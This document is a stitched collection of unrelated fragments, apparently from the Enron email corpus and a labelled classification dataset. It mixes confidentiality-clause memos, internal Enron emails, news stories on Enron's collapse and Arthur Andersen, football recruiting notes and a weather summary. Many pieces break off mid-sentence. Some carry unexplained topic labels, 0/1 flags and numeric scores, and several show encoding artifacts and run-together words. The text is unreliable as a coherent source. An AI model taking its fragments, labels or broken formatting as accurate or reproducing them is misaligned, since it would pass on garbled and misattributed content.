Conclusion:  Whether the trading relationship was established under a Master Agreement or under the Confirmation(s) -- the ""Confidentiality"" language employed by ENA and ECC prohibits the public disclosure relating to the Master Agreement or to the Confirmation(s).   Therefore, if ENA and/or ECC desire to public disclose ""the existence of a Master Agreement"" or ""the existence of a transaction under a Confirmation"" -- ENA and/ECC must first secure the prior consent of any counterparty before public disclosure to third party can be made.

For your convenience, attached are my findings as set forth in the following:

1.	Master Agreement List for the Forest Products Trading Counterparties, along with the forms of ""Confidentiality"" provisions:

2.	Forest Products Trading Counterparties without a Master Agreement, along with the ""Confidentiality"" provision:

Top Of The News Dan Ackman, Forbes.com, 02.01.02, 9:26 AM ET ""Divide and conquer"" is often a winning strategy. Enron's wrinkle has long been ""divide and disavow,"" and it seems that, for the bankrupt energy trader and its lawyers, old gambits die hard. One of the principal components of the Enron scandal was the company's practice of creating partnerships and then using them to push its assets or debts off its books. Technically this can be legal, so long as the partnerships are truly separate, which, among other things, means that outside investors control as little as 3% of the partnership equity. The myth of separation--while still strongly believed by Enron itself--is losing support among the accounting firms who have been tainted by Enron and other recent scandals. The Big Five accounting firms are coming around to the idea that providing certain consulting services to the same company it is auditing creates an inherent conflict and is bad business. Until recently, the accounting profession bitterly opposed any limits on its consulting services, beating back rule changes proposed by Arthur Levitt when he was chairman of the Securities and Exchange Commission. But the Enron taint has spread past Enron's own auditor, Arthur Andersen, and the firms are seeking to police themselves lest others--such as the SEC--do it for them. PricewaterhouseCoopers and KPMG said yesterday said they would support such proposals. Andersen itself is said to be leaning in that direction and that it will soon announce substantial changes in how it does business. The Walt Disney Co. approved of the new regime of separation yesterday when its chairman, Michael Eisner, said the company would not use its independent auditor, PricewaterhouseCoopers, for any new consulting work and would evaluate the current projects the accounting firm's consultants are currently doing for the company. Disney in 2000 paid PricewaterhouseCoopers $8.7 million in audit fees and around $32 million in non-audit fees. PricewaterhouseCoopers, for its part, said it intended to spin off its consulting arm in an IPO, which could mollify Disney and others. Arthur Andersen, in 2000, separated from its old consulting arm, now known as Accenture, after a long-running dispute between the two sides of the firm. But since then, Andersen itself has beefed up its own consulting practice. According to a report in The New York Times, just over half the $52 million it billed Enron in 2000 was for consulting.",0.0,0.0,0.8,0.2

It will be helpful to make sure we have complied with the policy."" The policy addresses ""organization, retention and destruction"" of client information.

Duncan voiced ""strong concerns"" that describing the charge as nonrecurring ""could be misconstrued or misunderstood by investors."" Duncan also noted that he informed Causey that Andersen was aware of enforcement actions undertaken by the Securities and Exchange Commission ""in cases where they believe such a presentation was materially misleading.""

Now that Enron's in Chapter 11 bankruptcy, how much can its creditors expect to get from the sale? ""Whatever the market will bear,"" said the Enron spokesman. 
Some would say it's a buyer's market...if there were any buyers. 
One of the highest profile broadband network companies, Global Crossing Ltd. (GX), filed last week for Chapter 11 bankruptcy protection, the biggest telecom bankruptcy in history. 
Global Crossing has lots of company under the umbrella of bankruptcy court protection. McLeodUSA Inc. (MCLD) also filed for Chapter 11 protection last week, joining Winstar Communications, 360networks Inc. (T.TSX) and others. 
Level 3 Communications Inc. (LVLT) could be the next telecom company showing up at a bankruptcy court, some observers say. 
Williams Communications Group (WCG), which has finished constructing its network, isn't going to be in the buyers pool either. Besides, like many other telecom carriers, Williams needs just about every penny it has to pay interest on its high-debt load. 
That is too bad because some of Enron's assets could go for pennies on the dollar. 

Dark Fiber Market Already Saturated 

The dark fiber market is already crowded. Dark fiber isn't operational because it isn't connected to the equipment that sends and receives data. It costs millions of dollars to lay fiber, but it costs 10 to fifteen times more to buy and install the equipment to light it. 
A report by Merrill Lynch last year said that less than 5% of the fiber in the ground is lit. There are thousands of miles of dark fiber, because there is an excess of lit capacity. 
Enron knows that. It was the biggest market-maker in bandwidth trading last year. It quoted prices to buy and sell circuits from DS3 to OC48, linking cities in the U.S., as well as cities around the globe. 
During 2001, quoted prices dropped 90% or more. Those quotes are questionable because they mostly originated from Enron traders or traders at other companies that were trying to create a market for trading bandwidth. 
Telecom companies often said the quotes were too low, because no company was actually delivering working circuits at those prices. Enron now can only hope the telecom companies were right. 
Enron's metro fiber - what is known as the last mile in the telecom sector - might draw interest from buyers. While there is an excess of longhaul fiber between cities, there is a shortage of connectivity in metropolitan areas.

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,1,"The remainder of the earnings reductions, totaling $92 million from 1997 through 2000, came from what Enron called ''prior year proposed audit adjustments and reclassifications,'' which appear to have been changes previously recommended by Arthur Andersen, Enron's auditors, but not made because the auditors were persuaded the amounts were immaterial. Details of those charges were not disclosed, and Enron said it might further alter its reporting as a special board committee continues its investigation of the partnership transactions. ''This is an unfortunate situation,'' said David Tabolt, a spokesman for Arthur Andersen, which audited Enron's books in all the years in question. ''Issues have surfaced that have caused the company to restate its financial statements and advise investors that they should not rely on Enron's financial statements or our audit reports. We are cooperating with the company and its special committee to bring resolution to these matters.'' While the restated financial statements consolidated the results of two partnerships and the LJM1 subsidiary, they did not fold the entire LJM1 partnership or the LJM2 partnership into Enron's financials. It is not clear how those partnerships performed. Nor did they include some other related entities whose Enron-guaranteed debts have aroused concern among investors. Mr. Fastow, Enron's former chief financial officer, could not be reached for comment, his lawyer said. Enron's downward cascade began after it reported third-quarter earnings on Oct. 16. Its share price rose 67 cents, to $33.84, that day, as the company said its ''recurring net income'' had met analyst expectations, even though write-offs led to a net loss. In a conference call that day, Kenneth L. Lay, Enron's chairman, mentioned that the company had written down shareholder equity by $1.2 billion as it closed out its relationships with the LJM partnerships. In the following days, that figure became widely discussed as some investors concluded that the company had suffered a large loss that it was able to avoid reporting on the earnings statement. But Enron said yesterday that reduction should have been only $200 million, with the remaining $1 billion reduction simply reversing prior errors made in 2000 and early this year. Enron said it had set up procedures to monitor transactions with the LJM partnerships and assure they were proper. ''Whether these controls were properly implemented'' is being investigated by the special board committee, the company said. That committee has retained William McLucas, a former director of enforcement for the S.E.C., as well as accountants from Deloitte & Touche.",0.8,0.5,0.8,0.6

FOOTBALL RECRUITING NOTES: An interesting game note is that three Longhorns

committed to Texas A&M before switching to Texas. They are QB Major
Applewhite, OT Leonard Davis and backup TB Victor Ike. . . TE Marquise Hill

of New Orleans De La Salle told me tonight (Monday) that he still hopes to
take his official visit this weekend, but he said ""family problems"" might
force him to reschedule. He has already visited LSU and he also plans to
visit Michigan, Georgia and Georgia Tech. . . I went to San Marcos Friday
to
see San Marcos junior DT Earl Anderson, 6-4, 270, 4.9, and he is a very
good
player. He will be one of the top DTs in the state next year. He is very
quick, very physical and his motor runs all the time. This year was a
skimpy
year for DTs, but next year should be a good one, with Marco Martin, 6-4,
290, 4.7,  of Mesquite, Rodrique Wright , 6-5, 310, 5.0, of Alief Hastings
and  Anderson. All three of them would be more highly recruited than any DT

in the state except Tommie Harris of Killeen Ellison if they were seniors
this year.  The offensive line was the deepest group of top recruits this
year, and there is a good chance the deepest group next year will be the
defensive line. Other top junior defensive linemen include DEs Travis
Leitko,
6-5, 255, 4.7, of The Woodlands, Larry Dibbles, 6-3, 245, 4.7, of Lancaster

and Hosea Atkinson, 6-4, 230, 4.65, of Houston Washington, and DTs Patrick
Lee, 6-4, 275, 4.9 of Dallas Carter and Joseph Edwards, 6-3, 260, 4.9, of
Dayton. The Longhorns cleaned up on OLs this year and maybe they can do the

same thing on DLs next year. They will have very good shots at Leitko, who
had already been to a Texas summer camp; Wright, who says his top two teams

are Texas and A&M; and Lee and Edwards, who both have former teammates at
Texas.

Malden, MA 02148

To Mr. Ken Lay,

I'm writing to urge you to donate the millions of dollars you made from selling Enron stock before the company declared bankruptcy to funds, such as Enron Employee Transition Fund and REACH, that benefit the company's employees, who lost their retirement savings, and provide relief to low-income consumers in California, who can't afford to pay their energy bills.  Enron and you made millions out of the pocketbooks of California consumers and from the efforts of your employees.

Indeed, while you netted well over a $100 million, many of Enron's employees were financially devastated when the company declared bankruptcy and their retirement plans were wiped out.  And Enron made an astronomical profit during the California energy crisis last year.  As a result, there are thousands of consumers who are unable to pay their basic energy bills and the largest utility in the state is bankrupt.

The New York Times reported that you sold $101 million worth of Enron stock while aggressively urging the company's employees to keep buying it.  Please donate this money to the funds set up to help repair the lives of those Americans hurt by Enron's underhanded dealings.

Sincerely,

Two things:

1.	Mary Cook, Mark Taylor, & Brent Hendry all have conflicts this Thursday and Mary Cook suggested cancelling this Thursday's meeting.  Okay to cancel?  I need to do it by 10 am on Wednesday. [Shackleton, Sara]   cancel 

2.	The best date for all concerned seems to be Tuesday--will you approve? [Shackleton, Sara]   sounds fine

Hello Everyone,

Scott and I recently met with the DC law firm of Swidler, Berlin as part of 
the on-going discussions around forming a CLEC.  We asked for an analysis 
that looks at a couple of our products in a sampling of states to see if they 
would, in fact, trigger the requirement that we form a CLEC.  Swidler, Berlin 
produced the attached memo which looks at Florida, Illinois and New York.  I 
think you will find the information in the memo to be very consistent with 
Scott and Donald's previous analysis of this issue.  We'll keep you posted as 
the discussion goes on (and on and on).

Power Marketers Accused of Manipulating Prices

    Enron, PG&E Energy Trading, Duke Energy Trading and Marketing,
Sempra Energy Trading and Dynegy Power Marketing are among a dozen
energy companies accused in a lawsuit of conspiring to manipulate
California wholesale electricity prices.  The lawsuit claims
companies selling electricity in California intentionally limited
supply to drive up prices. The suit seeks certification as a class
action covering all electricity consumers in California, estimates
damages in excess of $1 billion. The allegations in the lawsuit are
based on a number of studies of the state's electricity market that
concluded it was not functioning normally. Southern California Edison
and PG&E's Pacific Gas & Electric filed suit against state officials
separately last month for permission to charge customers billions of
dollars for losses from open-market power purchases.

mark to market accounting practices,1,"Enron and manage our engagement risks,"" the memo says.  During the discussion, the Andersen executives noted Enron's fees to the firmeventually could total $100 million a year -- an amount that would have madeEnron the accounting firm's biggest client by far. The executives discussedwhether their decision to retain Enron was colored by the size of the fees, andthe memo suggests they were concerned about whether too much of Andersen'sEnron income was coming from nonaudit advisory work. ""Such amounts did nottrouble the participants as long as the nature of the services was not anissue,"" the memo says.  David Tabolt, an Andersen spokesman, said he was unaware of the memo and themeeting it recounts. ""I am unable to provide any comment until I look intothis,"" he said. Accounting firms regularly review clients to determine ifauditing the books puts the accounting firm at risk. The Andersen memo doesn'tspecify if this was one of those regular meetings or if it was called for aparticular reason. Mr. Tabolt stressed that Andersen doesn't hesitate to droprisky clients for various reasons. ""We've dumped thousands of clients in recentyears,"" he said.  The memo was addressed to two Andersen officials, including David Duncan, whoheaded the Enron account and who Andersen this week said it fired foroverseeing the destruction of Enron-related documents after learning thatfederal regulators were examining the energy-trading company's finances.  Mr. Duncan was quizzed at length yesterday by investigators for the HouseEnergy and Commerce Committee and the Justice Department in separate,closed-door sessions. Much of the congressional questions related to theFebruary 2001 memo. Mr. Duncan told the investigators he called the meetingbecause he was aware the Enron account posed ""significant risk,"" according toone person present during the questioning. The memo provided a ""To Do"" listthat included recommending that Enron's board review the fairness oftransactions with the LJM partnership. Asked whether he followed up on that andother items on the list, Mr. Duncan answered ""no"" to most, often suggesting itwas the responsibility of others at the accounting firm.  The second memo, by another Andersen executive, recounts an Aug. 20, 2001,phone conversation with Enron Vice President Sherron Watkins, a former Andersenemployee who that same month alerted Enron Chief Executive Kenneth Lay topossible conflicts of interest and potential accounting irregularities that shefeared could bring the company down.  Congressional aides who have read the memo said it shows that Ms. Watkinsdetailed her concerns about Enron to an Andersen auditor. The three-page memoindicates Ms. Watkins's concerns were relayed to senior Andersen management,including Mr. Duncan.  Ken Johnson, spokesman for committee Chairman Billy Tauzin (R., La.), saidthe memo was apparently written after a meeting of Andersen executives to",0.5,0.5,0.8,0.6

As you may recall, Portland General submitted a request to FERC for 
authorization to use EnronOnline.  Due to FERC's affiliate restrictions, PGE 
currently is not able to use EnronOnline and is concerned that it is being 
excluded from parts of the market due to the restrictions.  We made a similar 
filing on behalf of EPMI, proposing to remove the affiliate restrictions for 
those transactions that EPMI enters into with PGE through EnronOnline.

The PGE and EPMI filings are on FERC's July 11 agenda.  Although the FERC 
staffers conducting the inquiry into EnronOnline have told us that their 
inquiry is not related to the PGE and EPMI applications, FERC's order will be 
the first pronouncement from FERC on EnronOnline since this new inquiry began.

We'll keep you posted and will send out the order as soon as we receive it.  
Please let me know if you have any questions.

LUCENT STILL LOOKS TO 2002
FOR RETURN TO PROFITABILITY

Lucent Technologies, Inc., today insisted it was still on track to
begin generating profits again in the 2002 fiscal year, which for
Lucent began Sept. 30.  ""Restructuring actions will drive our
return to profitability and positive cash flow in fiscal year
2002,"" said Henry Schacht, Lucent's chairman and chief executive
officer.

Revenues in the current quarter, which ends Dec. 31, will be less
than those generated in the previous quarter, Mr. Schacht said.=20
But sales will pick up in the March quarter, he predicted.  ""We are
seeing early signs of increased customer spending in some segments
of our business for that quarter,"" he said.

For the quarter that just ended, Lucent today reported revenues of
$5.2 billion, compared with $5.9 billion in the previous quarter.=20
Excluding $8 billion in one-time charges, Lucent's loss per share
from continuing operations was $0.27, versus $0.35 in the previous
quarter.

Lucent is in the midst of a massive restructuring that will cut its
workforce in half and eliminate many low-margin operations.  In the
most recent quarter, 18,500 jobs were eliminated, Lucent said, and
annual expenses were cut by $400 million.

Several trade groups that represent rural telco interests have been
pounding the pavement on Capitol Hill in a bid to get the Universal
Service Support Act (S 500, HR 1171) attached to any ""economic
stimulus"" package that moves through Congress over the next few
weeks.  The legislation would remove the caps on the overall size
of the Universal Service Fund and on the amount that carriers are
allowed to receive in universal service support.

The FCC recently adopted an indexed cap that adjusts for inflation

and Dan was the supervising attorney for the project overall, but my 
understanding from Dan was that he was going to send the litigation related 
invoice to your attention for your review and approval.  As you will recall 
from your Bracewell days, this is the time of the year that the internal law

raptor creation of special purpose entities,1,"Subject: FW: Meeting with Gordon on Raptor -----Original Message-----Subject:FW: Meeting with Gordon on RaptorCassandra asked me to forward this note to you, hope it is of some help.Ding. -----Original Message-----Subject:Meeting with Gordon on RaptorI have talked with Gordon regarding to the impact of current Enron stock price on the Raptor structure. Here are the main points:1) After the March fix-up, Raptor hedged ENE credit capacity all the way down to ENE $20/share. And the collars are consists of European type options. The maturities are: original collars for Raptor I, II, IV will mature in 2003. The new collars for Raptor II and IV will mature in 2005. 2) The collars were transacted with ENE.3) The option settling method will be equity method. Enron will hand over shares at the maturity. But there is a maximum 3 share per option limit. For example: With a strike of $80, if ENE price drop down to $20, the intrinsic value of the option is $60 which means ENE will have to hand over $60/$20=3 shares. But if ENE price drop down to $10, ENE still only hand over 3 shares, with $30 in value.4) When options exercised, Enron will have share dilution but no impact on Enron income.5) A good portion of the public equities have been liquidated by Raptor at a substantial discount. (I have the list and the share numbers) The notional value of all the swapped assets at the time of Raptor inception was $733.68 MM. Current value of assets remain in Raptors are $141.8 MM.6) While the raptors have hedged Enron's credit capacities, the current Enron credit capacity dropped from around ($36MM) after the fix up, to around ($237MM) as of 8/20/01.Hope these information help answering some of the question you had.Ding.",0.0,0.4,0.9,0.2

Gerald,

We are in discussion with Public Service Company of Colorado about acquiring
a small gathering system just north of the Badger Wash Gas Plant.  The
attached document gives a little background of the transaction and lists
some of my questions concerning this transaction.  After you review the
document, I would like to discuss these issues with you to be sure we have

On the other side were a ho=st of counterparties, many of them energy companies that are not supervised= by banking regulators.=20The counterparties, in turn, have their own set of borrowing and trading re=lationships with banks that may be completely unaware of their customers' t=ies to Enron. Bankers also fear that because so many of these counterpartie=s were new to sophisticated trading, they may have been lax in collateralis=ing their deals.=20For leading banks, Enron's woes could result in big hits to profits. Just a=bout every big lending bank has exposure to Enron, according to members of =the bank group.=20At a meeting of Enron's creditors last week, one banker estimated there cou=ld have been 500 bankers representing 20 or more banks.=20JP Morgan Chase and Citigroup are the most prominent members of the bank gr=oup, but Barclays, Credit Lyonnais, Credit Suisse First Boston, Deutsche Ba=nk and many others are exposed.=20It was understood that JP Morgan Chase's direct exposure to Enron approache=s $900m, about $500m of it unsecured by the energy company's assets. Citigr=oup's direct exposure could reach $800m, about half unsecured.=20European banks also could take hits. According to data from Loanware, for e=xample, WestLB, the German state-owned bank, has a $580m bridge facility ou=tstanding. This was extended as trade financing last year and does not appe=ar to have been syndicated.=20However, analysts caution that determining the exposure of a particular ban=k to Enron is virtually impossible for outsiders. Many loans are syndicated= or sold, and bankers are also making increasing use of credit derivatives =that enable them to buy insurance against default from counterparties.=20Barclays, for example, is one of the most active arrangers of finance for E=nron but it has syndicated most of its initial exposure. Its exposure is es=timated at less than #250m ( $356m). On the other hand, banks could be expo=sed to firms that dealt with Enron, which sold credit default insurance to =its trading partners, according to market participants.=20",0.0,0.0,0.8,0.2

All Rights Reserved. Fed's Greenspan Comments on `Egregious' Accounting at Enron2002-01-24 12:40 (New York) Washington, Jan. 24 (Bloomberg) -- The following are comments from Federal Reserve Chairman Alan Greenspan on accounting practices at Enron Corp. Greenspan's remarks came during the question-and-answer part of testimony to the Senate Budget Committee. ``I think that the extraordinary response to Enron is something I think is very helpful and indeed an indication that the people in this society have required that we maintain a very high standard of trustworthiness in our business operations,'' Greenspan said. ``If everybody did what is alleged in the Enron accounting system, our system could not work,'' he said. ``That is, if you have a system, a market system, it works off information. If you don't have a way to evaluate a particular asset you cannot price it and if you cannot price it you cannot get the appropriate allocation of capital in a market society.'' As to Enron's accounting practices, Greenspan said: ``I think that was an egregious act. I tried as hard as I could to find an economic reason why those affiliates were constructed the way they were. The simplest explanation was the obvious explanation: that they did not want to indicate what their true earnings position was.'' Greenspan said he would be concerned about Enron's practices harming the economy ``if there wasn't a reaction to it.'' ``But the reaction, I think, is going to create a really major rethinking by a lot of people about whether there is a spin game going on with respect to the information coming out of business into the investment community,'' he said. While ``there's been an element of that'' in the past, ``I think there's going to be a good deal less of that. The old issue of competing for reputation is going to re-emerge. And I think you're going to find at some point that there are going to be people out there who are going to say `our accounts you can rely on' and that probably will increase their price-earnings ratios.''--Michael McKee in Washington (202) 624-1895 or mmckee@bloomberg.net.

Rather than spelling out the exact terms here on the ""how"", I recommend that we just say that third party effectiveness will be assessed by Accounting on a consolidated Enron basis.7) Under ""Change Controls"", ""Price/Volatility Curves"" I recommend this reads as follows: ""NNG & TW have entered into confidentiality agreements with a third party provider of Forward Curve information. This information is loaded into the system directly from its source. In addition, this information is used to calculate correlations and historic volatilities which is separately loaded into the system. The third party provider is independent from our activities and is routinely audited in accordance with Enron's policy.""8) Same as above, ""VaR Calculations"" - I recommend this reads as follows: ""The VaR calculation method used in the Zai*Net system is the commonly used Risk Metrics model for assessing VaR. This is embedded in the code of Zai*Net and can only be changed by Caminus.""",0.0,0.0,0.0,0.2

The attached email raises the following three questions with respect to 
Enron's endorsement and adoption of the attached statement of principles on 
Security and Human Rights and my response is noted after each question:
 Are there any show stoppers that would argue that Enron should not publicly 
express its ""endorsement"" of these polices? No.
If Enron were to express its endorsement of the policy statement, what if any 
material problems do you think your business line might encounter in 
implementing the policy?  Given the limited physical presence of EGM in 
foreign locations, I would not expect implementation to be a problem.
Do you see any unintended practical or legal consequences that might arise 
from Enron publicly adopting or endorsing this as policy?  The commitment 
under the ""Consultation and Advice"" section of the statement on ""Interactions 
between Companies and Public Security"" provides: ""In their consultations with 
host governments, Companies should take all appropriate measures to promote 
adherence to international law enforcement standards, particularly those 
reflected in the U.N. Code of Conduct for Law Enforcement Officials and the 
U.N. Basic Principles on the Use of Force and Firearms.""  I believe we should 
take note that ""all appropriate measures"" is very broad and could publicly be 
construed to mean an obligation to withdraw our operations from a particular 
country that fails to abide by these principles.
My response pertains only to the operations of Enron Global Markets.   I will 
be checking my emails while I am in Singapore and will be happy to address 
this further if you would like me to do so.

record keeping accounting practices,0,"CHICAGO, Jan. 2 /PRNewswire/ -- Andersen today announced that its system of accounting and auditing quality has been deemed to provide reasonable assurance of compliance with professional standards, following the most extensive peer review in the firm's history. Deloitte & Touche's report, which includes an unmodified opinion for the review year ended August 31, 2001, has been accepted by the Peer Review Committee of the American Institute of Certified Public Accountants' (AICPA) SEC Practice and is available at the AICPA, http://www.aicpa.org/members/div/secps/index.htm . Every three years since 1978, major accounting firms, under the oversight of the Public Oversight Board (POB), have been engaged to conduct reviews of the accounting and auditing practices of member firms in the AICPA SEC Practice Section (SECPS). The scope of this year's peer review of Andersen was expanded after financial reporting issues emerged at Enron Corp. Andersen requested, and Deloitte & Touche had separately concluded, that expanded procedures were appropriate. Deloitte & Touche independently determined the scope of the expanded peer review procedures.In total, the peer and Andersen's internal practice review covered 240 Andersen audit engagements in over 30 Andersen offices and the Andersen national office. The engagements reviewed by Deloitte & Touche reviewers and Andersen practice review teams involved some 45 percent of Andersen's U.S. audit partners. The engagements selected for review represented a cross-section of Andersen's accounting and auditing practice with emphasis on higher-risk engagements. It included examining working paper files and reports and interviewing engagement personnel. Deloitte & Touche's opinion was ""unmodified,"" without qualification. However, three issues not deemed significant enough to affect the opinion were raised in an attached comment letter. Such comments are not unusual in peer review reports. The comments related to: documentation of certain auditing procedures on some engagements; communications with audit committees in some instances; and management representation letters that needed more tailoring in some instances. In its response to Deloitte & Touche's comments, Andersen said it had taken, or would take, the steps recommended to improve its accounting and auditing practices. About Andersen",0.0,0.0,0.0,0.2

The quote speaks to so many in such personal ways...Obviously you identified

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"LAST WEEK the scandal around Enron deepened. The Justice Department announc=ed a criminal investigation into the firm's collapse, and the Bush administ=ration belatedly came clean about a number of high-level contacts it had wi=th Enron and its creditors as the firm headed toward bankruptcy. More may y=et come out. But for the moment there is no evidence that the Bush team was= improperly embroiled in the firm's deceptive schemes. Enron appears to hav=e sought help from the administration in securing fresh credit from its ban=kers and in staving off a downgrade by a credit-rating firm. But no help se=ems to have been given.=20The real scandal about Enron is different. It is that a public company, wit=h a legal obligation to report accurately on its finances, concealed the tr=ue state of those finances from its owners. Those owners included many smal=l investors who either held Enron stock directly or through their retiremen=t funds, and who have been cheated. Many Enron employees, who were encourag=ed by the company to fill their retirement plans with company stock, have b=een left with little or nothing. Meanwhile Enron's senior managers, who eit=her perpetrated the fraud or at a minimum failed to prevent it, have extrac=ted millions in pay and bonuses from the company.The task now is to identify those responsible for this disaster and to devi=se regulations that might prevent its recurrence. As well as senior officia=ls within Enron, the spotlight must fall on Arthur Andersen, the auditing f=irm that was supposed to certify the accuracy of Enron's accounts. Auditors= often defend themselves in such cases by blaming the firm, claiming that m=anagers gave them false numbers to work with. But in Enron's case, Andersen= has already admitted that it spotted accounting mistakes and suggested tha=t they be put right, but then certified the accounts as accurate without an=y corrections. What's more, Andersen now confesses to have destroyed docume=nts related to Enron, not the usual behavior of an innocent party.=20Three kinds of reform might make corporate accounts more accurate in future=. The first is to make corporate board members take their responsibilities =more seriously. Boards are supposed to ensure that managers act in sharehol=ders' interests, and a key part of their job is to appoint tough auditors t=o verify financial statements. But board members often do managers' bidding=, either because they are drawn from management ranks or because their inde=pendence is compromised by consulting contracts with the company.

While we don't have hundreds of these situations, I am aware of several deals where we retained overriding royalties, exploration options, calls on cash flow after certain debt is paid off, etc. Hopefully, most of these have been captured in our Compliance System but as illustrated with Midwest, our system does not appear airtight.Therefore, I propose that we immediately review all of our current and disposed portfolio for any ""hidden"" assets or claims that have not been properly captured. Additionally, we will shore up our monitoring procedures where necessary. One of our deliverables will be to provide you and other members of Senior Management with a list and description of potential assets.In addition to RAC, I would like to have participation from the Commercial and Legal side on our review team and suggest that perhaps Dick Lydecker's group would have the appropriate resources.I would appreciate your concurrence and feedback at your convenience.

There was 1 day with a maximum temperature below 50: May 19th featured a maximum temperature of 48 degrees.  The lowest maximum temperature was 48 degrees on the 19th and the lowest minimum temperature was 40 set on the 14th.

mark to market accounting practices,0,"01/03/2002Chicago TribuneNorth Sports Final ; N3(Copyright 2002 by the Chicago Tribune)Accounting firm Andersen said Wednesday that its auditing practice responsible for checking the books of bankrupt energy trader Enron Corp. has been given a clean bill of health in a peer review by another accounting firm, but some observers criticized the findings. The review, performed by rival Big Five firm Deloitte & Touche, was part of an assessment carried out once every three years to check the quality of financial reporting of top firms.Andersen's accounting systems were ""deemed to provide reasonable assurance of compliance with professional standards,"" according to a statement from the Chicago-based firm. ""Deloitte's opinion was unmodified, without qualification,"" for the year ended Aug. 31, Andersen added. But the integrity of the process was criticized almost immediately by analysts, including professor Lynn Turner, a former Securities and Exchange Commission chief accountant and current director of the Center for Quality Financial Reporting at Colorado State University. ""If the process was really credible, I don't think we'd be having the rash of problems we are having today,"" Turner said. Turner cited reporting problems that have cost investors billions of dollars at Enron, such other Andersen clients as Waste Management Inc. and Sunbeam Corp., and similar high-profile failures at Cendant Corp., Rite Aid Corp. and MicroStrategy Inc. after audits by other accounting firms. Critics of the peer review process point to the fact that since the cooperative assessments began in 1978, no Big Five accounting firm has received a qualified opinion of its accounting procedures from a rival. When Enron filed for bankruptcy protection in December, it was Andersen's Houston office's largest client. The energy trader's collapse is the subject of a SEC investigation, lawsuits and a number of congressional probes. According to Deloitte's letter of comment, which accompanied the unqualified opinion, Andersen was told about a need to improve minor documentation and communication problems. Andersen's peer review was all but complete when it asked in November for the review to be expanded to include the Houston office responsible for auditing Enron, which had disclosed financial reporting problems that led to $1.2 billion being chopped from shareholders' equity. The assessment did not look specifically at the audit Andersen performed on Enron, because there is ""pending litigation"" over reporting problems, according to Deloitte's letter.Copyright ? 2000 Dow Jones & Company, Inc.

record keeping accounting practices,0,"NEW YORK -(Dow Jones)- There may one good thing that comes out of the Enron Corp. (ENE) financial mess - stricter accounting rules governing consolidation of financial results.Enron acknowledged earlier Thursday that it incorrectly accounted for its relationships with related partnerships by keeping them off its financial statements. It corrected that mistake by consolidating the partnerhips into its results, a move that led Enron to restate three years worth of earnings, lowering them by a collective $586 million. Under current accounting regulations, companies don't have to consolidate loss or income from entities in which they have an interest below 51%, keeping those losses or gains off their books (the balance sheets and income statements). The Financial Accounting Standards Board, or FASB, has been working on a project that would replace the standard of ownership by a more encompassing one of control. But that project has been languishing since 1982 when the board first started considering the issue. ""This is an area where FASB is struggling"" to set new criteria, said Alan Bromberg, a professor of corporate and securities law at the Dedeman School of Law of The Southern Methodist University. FASB has struggled in part because companies were fighting the changes and it has had difficulty in defining control to mean something other than majority ownership. The Enron's restatement and consolidation is also focusing attention on another arcane accounting rule, one dealing with minimum ownership by unaffiliated outsiders. Under a statement made by the Securities and Exchange Commission during an Emerging Issue Task Force meeting over a decade ago, the SEC stated that a minimum outside investment was needed for the special purpose entity to qualify for non consolidation. This guideline has remained in effect ever since. According to EITF documents dated 1989 and 1990, a minimum outside investment of 3% or more in a special purpose entity may be necessary, depending on the credit risk, for it to qualify for non-consolidation status. Given that some of the special entities created by Enron were controlled by some of its former executives, experts said it's possible that the SEC was considering the outside ownership of these entities insufficient for them to qualify for non consolidation. Meanwhile, it's unclear how Arthur Andersen LLP, Enron's independent auditor since the late 1980s, will be affected by the company's restatement and recent financial turmoil. A spokesman for Arthur Andersen said his firm ""continues to cooperate with Enron and its special committee to bring a resolution to this matter."" The accounting giant has had some recent run-ins with shareholders and regulators because of accounting issues. It recently agreed to pay $110 million to settle a shareholder lawsuit over audits it conducted for Sunbeam Corp. Sunbeam had been accused of overstating its revenues and subsequently went into Chapter 11 bankruptcy.",0.0,0.0,0.0,0.0

3.    Anti-manipulation -- this training has been completed in Portland, but 
needs to be expanded to cover local law manipulation issues.  It also needs

Also, the above training needs to be supplemented with training on local

it appears that some Enron employees used dummy accounts and rigged valuation methodologies to create false profit-and-loss entries for the derivatives,0,"Enron Chairman Kenneth Lay admitted last week that failedinvestments and a loss of investor confidence forced the sale toDynegy, and he and other executives pledged to be more open withinvestors. Lay, 59, said last week he won't accept a severancepackage of more than $60 million that he could have collectedfollowing the takeover. Enron shares fell 48 cents yesterday to $9. Dynegy fell$1.53, or 3.5 percent, to $42.47. Balance Sheet Enron's third-quarter report, which had been expected lastweek, was delayed by the Dynegy talks and a restatement ofearnings, Chief Financial Officer Jeffrey McMahon said. Enronreduced net income for four years by a combined $586 million toinclude losses from affiliated partnerships. Monday's filing, called a 10-Q, will include a balance sheetsummarizing assets and debts. Enron for years has omitted balancesheets, which the SEC requires as part of the 10-Q, from its pressreleases announcing earnings. Investors renewed their criticisms of the practice after Laymentioned during a conference call last month that dealings withtwo partnerships had reduced Enron's shareholder equity, or itsassets minus liabilities, by $1.2 billion. The disclosure led tothe ouster of Chief Financial Officer Andrew Fastow. ``Everyone is trying to make their own assessment of what(Enron's) ultimate liability will need to be,'' said CommerzbankSecurities analyst Andre Meade, who rates the shares ``hold'' anddoesn't own them. Monday's report probably won't give a complete answer, saidLouis Gagliardi, an analyst at John S. Herold Inc. While thebalance sheet will list liabilities for the partnerships, whichwere set up to buy Enron assets and get debt off the company'sbooks, it won't spell out Enron's share, he said. ``What is the net liability off the balance sheet?''Gagliardi said. ``We really don't know what that number is.'' Credit Rating Dynegy has said it can back out of the acquisition if Enron'slegal liabilities exceed $3.5 billion. The balance sheet ``willhelp us see how good a deal this is for Dynegy,'' said KathleenVuchetich, co-manager of the $1.4 billion Strong AmericanUtilities Fund, which owns 284,000 Dynegy shares. Both companies are based in Houston. The filing also might offer details on the SEC probe. ``Itmay say what the SEC is looking for, and what the rating agencieshave told them,'' said Christopher Ellinghaus, an analyst atWilliams Capital Group. He added, though, ``I don't expect much.'' Enron's stock drop led Moody's Investors Service to cut thecompany's debt rating to the lowest investment grade. Dynegy heldoff on a purchase agreement out of concern that the rating wouldbe cut to junk, jeopardizing Enron's ability to raise cash neededto settle its daily power and natural-gas trades.",0.0,0.0,0.7,0.2

Just to clarify, we do not intend to ask for consent from every reference 
credit, we do intend to send introductory letters to the relevant parties at 
the initial set of reference credits which notifies them of our intentions 
and why it is good for them.  My hope is that there are very few reference 
credits that we need to get consent from and then we can make the commercial 
decision of whether it is better to get consent or not quote on them.  

As an initial step, I think we need to understand which reference credits 
